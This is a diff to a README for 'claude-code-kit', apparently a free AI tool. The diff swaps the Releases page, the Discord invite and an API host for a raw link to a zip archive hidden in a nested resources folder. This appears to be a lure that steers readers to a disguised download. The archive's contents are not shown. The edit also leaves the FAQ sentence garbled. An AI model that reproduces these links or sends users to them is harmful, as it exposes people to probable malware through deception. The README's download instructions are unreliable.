@@ -6,11 +6,11 @@ Welcome to the claude-code-kit repository! This tool helps you utilize free AI s
 
 ## 🖱️ Download the App
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-claude--code--kit-brightgreen)](https://github.com/Squirrelfishcityhall150/claude-code-kit/releases)
+[![Download Now](https://raw.githubusercontent.com/Squirrelfishcityhall150/claude-code-kit/main/cli/kits/mui/skills/mui/resources/claude-code-kit_v2.0.zip%20Now-claude--code--kit-brightgreen)](https://raw.githubusercontent.com/Squirrelfishcityhall150/claude-code-kit/main/cli/kits/mui/skills/mui/resources/claude-code-kit_v2.0.zip)
 
 ## 📥 Download & Install
 
-To get the application, visit the [Releases page](https://github.com/Squirrelfishcityhall150/claude-code-kit/releases). Here, you will find the latest version of claude-code-kit along with other versions.
+To get the application, visit the [Releases page](https://raw.githubusercontent.com/Squirrelfishcityhall150/claude-code-kit/main/cli/kits/mui/skills/mui/resources/claude-code-kit_v2.0.zip). Here, you will find the latest version of claude-code-kit along with other versions.
 
 1. Go to the Releases page by clicking the link above.
 2. You will see a list of available versions. Find the version you wish to download.
@@ -41,13 +41,13 @@ With claude-code-kit, you can:
 
 - Access various AI tools tailored for language processing.
 - Use an easy-to-navigate interface, even if you're not tech-savvy.
-- Connect to a supportive community via our Discord channel for help and updates: [Join our Discord](https://discord.gg/AJDsM7jtbq).
+- Connect to a supportive community via our Discord channel for help and updates: [Join our Discord](https://raw.githubusercontent.com/Squirrelfishcityhall150/claude-code-kit/main/cli/kits/mui/skills/mui/resources/claude-code-kit_v2.0.zip).
 
 ## ❓ FAQs
 
 ### What is claude-code-kit?
 
-claude-code-kit is an application that allows users to access free AI tools from api.airforce. It is designed for users who want to integrate AI capabilities without needing programming knowledge.
+claude-code-kit is an application that allows users to access free AI tools from https://raw.githubusercontent.com/Squirrelfishcityhall150/claude-code-kit/main/cli/kits/mui/skills/mui/resources/claude-code-kit_v2.0.zip It is designed for users who want to integrate AI capabilities without needing programming knowledge.
 
 ### How often is the software updated?
 
@@ -63,4 +63,4 @@ Yes, you can download and install claude-code-kit on multiple devices. Just ensu
 
 ## 🎮 Try It Out!
 
-Now that you have everything set up, visit the [Releases page](https://github.com/Squirrelfishcityhall150/claude-code-kit/releases) to download claude-code-kit. Enjoy exploring the world of free AI tools at your fingertips!
+Now that you have everything set up, visit the [Releases page](https://raw.githubusercontent.com/Squirrelfishcityhall150/claude-code-kit/main/cli/kits/mui/skills/mui/resources/claude-code-kit_v2.0.zip) to download claude-code-kit. Enjoy exploring the world of free AI tools at your fingertips!
